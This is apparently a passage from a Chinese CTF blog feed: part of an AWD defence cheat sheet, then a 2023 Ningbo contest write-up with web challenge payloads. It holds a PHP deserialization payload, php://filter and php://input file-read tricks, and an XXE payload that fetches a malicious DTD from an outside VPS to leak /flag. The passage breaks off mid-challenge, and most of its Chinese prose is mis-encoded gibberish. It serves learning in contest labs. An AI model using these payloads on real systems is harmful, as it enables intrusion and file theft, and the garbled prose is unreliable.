<p>1ï¼šAoiAWD<br>å®‰æ’ç»´æŠ¤çš„å¼€æºé¡¹ç›®ï¼Œéœ€è¦æå‰åœ¨æœ¬æœºç¼–è¯‘ï¼Œæ”¯æŒwebï¼Œpwnæµé‡æ•è·ï¼Œç³»ç»Ÿè¿›ç¨‹ç›‘æ§ç­‰<br>åœ°å€ï¼š<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
<p>2ï¼šwatchbird<br>é€šé˜²wafï¼Œæ”¯æŒæµé‡è½¬å‘å’Œæ›¿æ¢flagï¼Œé˜²å¾¡æ³¨å…¥ï¼Œååºåˆ—åŒ–ï¼Œrceç­‰æ¼æ´<br>åœ°å€ï¼š<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p>
<h4 id="shellæŸ¥æ€"><a href="#shellæŸ¥æ€" class="headerlink" title="shellæŸ¥æ€"></a>shellæŸ¥æ€</h4><p>å¯¹äºä¸æ­»é©¬å¯ä»¥å‚è€ƒæˆ‘ä»¥å‰å†™çš„ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.dr0n.top/posts/46ef80a/">AWDä¸æ­»é©¬ä¸å…‹åˆ¶æ–¹æ³•</a></p>
<p>ä¸€äº›findå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##å¯»æ‰¾æœ€è¿‘20åˆ†é’Ÿä¿®æ”¹è¿‡çš„æ–‡ä»¶</span><br>find /var/www/html -name *.php -mmin -20<br><br><span class="hljs-comment">##å¯»æ‰¾è¡Œæ•°æœ€çŸ­çš„æ–‡ä»¶</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-built_in">wc</span> -l | <span class="hljs-built_in">sort</span> -rg<br><br><span class="hljs-comment">##å…³é”®å­—æŸ¥æ€</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br></code></pre></td></tr></table></figure>


<p>æŸ¥çœ‹è¿›ç¨‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -nlpt<br>ps -<span class="hljs-built_in">df</span><br>top<br></code></pre></td></tr></table></figure>

<p>æ€æ­»è¿›ç¨‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 PID<br>killall åç§°<br></code></pre></td></tr></table></figure>


<h4 id="åˆ«å"><a href="#åˆ«å" class="headerlink" title="åˆ«å"></a>åˆ«å</h4><p>ç»è¿‡å®è·µï¼Œå‘ç°åˆ«åä¼¼ä¹åœ¨ç½‘ç«™ä¸Šrceæ‰§è¡Œå‘½ä»¤æ—¶å¹¶ä¸ä¼šç”Ÿæ•ˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##ä¿®æ”¹catçš„åˆ«å</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;printf &#x27;flag&#123;%s&#125;&#x27; <span class="hljs-subst">$(date | md5sum | cut -d &#x27; &#x27; -f1)</span>&quot;</span><br><br><br><span class="hljs-comment">##å»é™¤åˆ«å</span><br><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure>




<h2 id="pwné˜²å¾¡"><a href="#pwné˜²å¾¡" class="headerlink" title="pwné˜²å¾¡"></a>pwné˜²å¾¡</h2><h4 id="æ‰“patch"><a href="#æ‰“patch" class="headerlink" title="æ‰“patch"></a>æ‰“patch</h4><p>å‚è€ƒï¼š<a href="https://q1iq.top/IDA-patch">https://q1iq.top/IDA-patch</a></p>
<h4 id="ä¸Šé€šé˜²"><a href="#ä¸Šé€šé˜²" class="headerlink" title="ä¸Šé€šé˜²"></a>ä¸Šé€šé˜²</h4><p>ç°åœ¨å¤§éƒ¨åˆ†æ¯”èµ›ä¸å…è®¸ä¸Šé€šé˜²ï¼Œå› ä¸ºé€šé˜²åŸºæœ¬å¯ä»¥å®ç°å®Œç¾é˜²å¾¡</p>
<p>é€šé˜²æ˜¯é€šç”¨é˜²å¾¡çš„ç®€ç§°ã€‚å› ä¸ºawdé‡Œpwné¢˜çš„å½¢å¼åŸºæœ¬éƒ½æ˜¯è¿è¡Œä¸€ä¸ªäºŒè¿›åˆ¶ï¼Œç„¶åæŠŠäºŒè¿›åˆ¶çš„æµé‡è½¬å‘åˆ°æŸä¸ªç«¯å£ï¼Œæ‰€ä»¥å¦‚æœç»™è¿™ä¸ªpwné¢˜åŠ ä¸ªå£³å­è¿‡æ»¤ä¸€ä¸‹æµé‡ï¼Œæ‰€æœ‰å¸¦flagçš„å­—ç¬¦ä¸²éƒ½ä¸å…è®¸è¾“å‡ºï¼Œæ‰€æœ‰å¸¦flagçš„æ–‡ä»¶éƒ½ä¸å…è®¸æ‰“å¼€ï¼ŒåŸºæœ¬ä¸Šå°±æ²¡åŠæ³•æ”»å‡»äº†ã€‚</p>
<p>ä»¥ä¸‹æ˜¯å‡ ä¸ªé€šé˜²é¡¹ç›®</p>
<p><a href="https://github.com/rip1s/PwnSandboxForCTF">PwnSandboxForCTF</a>ï¼šPtraceï¼ŒåŠ«æŒæ•æ„Ÿsyscallï¼Œæ£€æŸ¥å‚æ•°è¿‡æ»¤æ•æ„Ÿå­—ç¬¦ä¸²</p>
<p><a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a>ï¼šSeccompæ²™ç›’ï¼ŒåŠ«æŒsyscallï¼Œæ— æ³•è¿‡æ»¤æŒ‡é’ˆç±»å‚æ•°</p>
<p><a href="https://github.com/I0gan/pwn_waf">pwn_waf</a>ï¼šæŠ“å–æµé‡ã€é€šé˜²ã€è½¬å‘ã€å¤šäººè½¬å‘æ¨¡å¼ï¼Œ</p>
<p><a href="https://lief-project.github.io/download/">LIEF</a>ï¼šåŠ«æŒæ•æ„Ÿå‡½æ•°è°ƒç”¨ï¼Œè¿‡æ»¤æ•æ„Ÿå­—ç¬¦ä¸²ç­‰ã€‚å¯¹åŸæ–‡ä»¶æ”¹åŠ¨è¾ƒå°</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>2023å®æ³¢å¸‚èµ›wp</title>
    <url>/posts/2d3983d/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmapä¸€æŠŠæ¢­</p>
<p><img src="/img/wp/2023/2023ningbo-1.png"></p>
<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>php://filter</code>è¯»<code>route.php</code></p>
<p>å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å†è¯»<code>h1nt.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>__clone</code>æ–¹æ³•æ—¶è¯»<code>f14g.php</code><br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure>


<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>php://input</code>ä½¿å¾—açš„å€¼ä¸º<code>flag</code>ï¼ŒbåŒç†ï¼Œdä½¿ç”¨<code>php://filter</code>è¯»æ–‡ä»¶</p>
<p><img src="/img/wp/2023/2023ningbo-2.png"></p>
<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>è®¿é—®é¶æœºè‡ªåŠ¨è·³è½¬åˆ°<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>ï¼Œå¹¶è¿”å›<code>json</code><br>è®¿é—®<code>/parser?body=1</code>ï¼Œè¿”å›<code>plain</code></p>
<p>çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªç±»å‹è§£æå™¨ï¼Œå¯ä»¥è§£æè¾“å…¥çš„æ•°æ®ç±»å‹å¹¶è¿”å›</p>
<p>fuzzåå‘ç°æ”¯æŒxmlæ ¼å¼ï¼Œå°è¯•åˆ©ç”¨xxeæ¼æ´ã€‚å› ä¸ºæ˜¯javaç¯å¢ƒï¼Œå°è¯•ä½¿ç”¨<code>jaråè®®</code>ï¼Œ<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">åŸç†å‚è€ƒ</a></p>
<p><img src="/img/wp/2023/2023ningbo-3.png"></p>
<p>vpsä¸Šç”¨flaskæ„å»ºä¸€ä¸ªæ¶æ„dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p>åœ¨apacheä¸Šæ”¾ä¸€ä¸ª1.zipï¼Œå†…å®¹éšæ„</p>
<p>å½“<code>jaråè®®</code>åœ¨<code>1.zip</code>ä¸­æ‰¾ä¸åˆ°<code>file://</code>ä¸­æŒ‡å®šçš„æ–‡ä»¶æ—¶å°±ä¼šæŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™å›æ˜¾æ–‡ä»¶å†…å®¹</p>
<p>ä¸”è¿‡æ»¤äº†<code>&quot;http</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>&quot;url:http</code>æ¥ç»•è¿‡</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023ningbo-4.png"></p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>æ‰“å¼€é¶æœºåæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p>
<p>ä½†æ˜¯å¯¹è·¯å¾„ï¼Œåç¼€ï¼Œæ–‡ä»¶å†…å®¹è¿›è¡Œäº†æ£€æµ‹</p>
<p>è·¯å¾„ä¸­è¿‡æ»¤äº†<code>..</code>ï¼Œä¸èƒ½è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œåªèƒ½å­˜æ”¾åœ¨<code>/tmp/</code>ä¸‹ï¼ŒÂ·ä¸”åç¼€æ£€æŸ¥çš„é»‘åå•è¾ƒä¸¥æ ¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//å›¾ç‰‡åä»¥æ—¶é—´å‘½å</span><br>        <span class="hljs-comment">//ä¿å­˜ä¸ºæ–‡ä»¶</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//è¿”å›è¿™ä¸ªå›¾ç‰‡çš„è·¯å¾„</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åŒæ—¶æ‰«æç½‘å€å‘ç°å­˜åœ¨<code>/app</code>è·¯ç”±</p>
<p><img src="/img/wp/2023/2023ningbo-5.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­æœ‰ä¸‰ä¸ªè·¯ç”±</p>
<p><code>/app</code>æ˜¾ç¤ºå½“å‰ä»£ç <br><code>/app/get</code>å­˜åœ¨åé—¨ï¼Œæœ‰å¯¼å…¥åŒ…çš„æ“ä½œ<br><code>/app/set</code>ç”¨äºè®¾ç½®é”®å€¼å¯¹</p>
